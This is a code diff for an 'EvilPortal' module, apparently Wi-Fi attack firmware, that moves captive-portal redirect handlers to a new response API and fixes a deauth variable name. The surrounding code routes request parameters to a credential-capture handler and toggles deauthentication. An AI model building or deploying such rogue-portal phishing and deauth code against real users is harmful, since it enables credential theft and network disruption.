@@ -129,14 +129,16 @@ void EvilPortal::setupRoutes() {
     // Modern captive portal detection URLs (most important for notifications)
     webServer.on("/generate_204", HTTP_GET, [this](AsyncWebServerRequest *request) {
         // Apple devices and many Android devices check this
-        request->sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
-        request->send(302, "text/plain", "");
+        AsyncWebServerResponse *response = request->beginResponse(302);
+        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+        request->send(response);
     });
 
     webServer.on("/gen_204", HTTP_GET, [this](AsyncWebServerRequest *request) {
         // Alternative for some devices
-        request->sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
-        request->send(302, "text/plain", "");
+        AsyncWebServerResponse *response = request->beginResponse(302);
+        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+        request->send(response);
     });
 
     webServer.on("/hotspot-detect.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
@@ -146,8 +148,9 @@ void EvilPortal::setupRoutes() {
 
     webServer.on("/library/test/success.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
         // Apple specific
-        request->sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
-        request->send(302, "text/plain", "");
+        AsyncWebServerResponse *response = request->beginResponse(302);
+        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+        request->send(response);
     });
 
     webServer.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
@@ -162,8 +165,9 @@ void EvilPortal::setupRoutes() {
 
     webServer.on("/redirect", HTTP_GET, [this](AsyncWebServerRequest *request) {
         // Generic redirect endpoint
-        request->sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
-        request->send(302, "text/plain", "");
+        AsyncWebServerResponse *response = request->beginResponse(302);
+        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+        request->send(response);
     });
 
     webServer.on("/success.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
@@ -171,13 +175,15 @@ void EvilPortal::setupRoutes() {
     });
 
     webServer.on("/canonical.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        request->sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
-        request->send(302, "text/plain", "");
+        AsyncWebServerResponse *response = request->beginResponse(302);
+        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+        request->send(response);
     });
 
     webServer.on("/fwlink", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        request->sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
-        request->send(302, "text/plain", "");
+        AsyncWebServerResponse *response = request->beginResponse(302);
+        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+        request->send(response);
     });
 
     // Add proper DNS responses for captive portal detection
@@ -188,8 +194,9 @@ void EvilPortal::setupRoutes() {
 
     webServer.on("/client.msftconnecttest.com/redirect", HTTP_GET, [this](AsyncWebServerRequest *request) {
         // Windows specific
-        request->sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
-        request->send(302, "text/plain", "");
+        AsyncWebServerResponse *response = request->beginResponse(302);
+        response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+        request->send(response);
     });
 
     // Add DNS masquerading for all domains (CRITICAL)
@@ -253,8 +260,9 @@ void EvilPortal::setupRoutes() {
             url.indexOf("generate") != -1 ||
             url.indexOf("msftconnecttest") != -1 ||
             url.indexOf("clients3.google.com") != -1) {
-            request->sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
-            request->send(302, "text/plain", "");
+            AsyncWebServerResponse *response = request->beginResponse(302);
+            response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
+            request->send(response);
         }
         else if (request->args() > 0) {
             credsController(request);
@@ -306,7 +314,7 @@ void EvilPortal::loop() {
         }
 
         if (check(SelPress)) {
-            isDeauthHeld = _deuth ? !isDeauthHeld : isDeauthHeld;
+            isDeauthHeld = _deauth ? !isDeauthHeld : isDeauthHeld;
             shouldRedraw = true;
         }
 
